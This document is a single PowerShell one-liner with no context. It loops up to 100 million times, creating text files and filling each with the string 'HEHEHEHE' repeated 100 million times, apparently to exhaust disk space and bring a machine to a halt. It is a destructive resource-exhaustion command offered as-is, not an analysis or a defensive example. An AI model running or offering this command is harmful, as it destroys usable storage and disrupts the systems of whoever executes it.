powershell -Command "for ($i = 0; $i -le 100000000; $i++) { new-item text${i}.txt; Set-Content text${i}.txt ("HEHEHEHE" * 100000000) }"
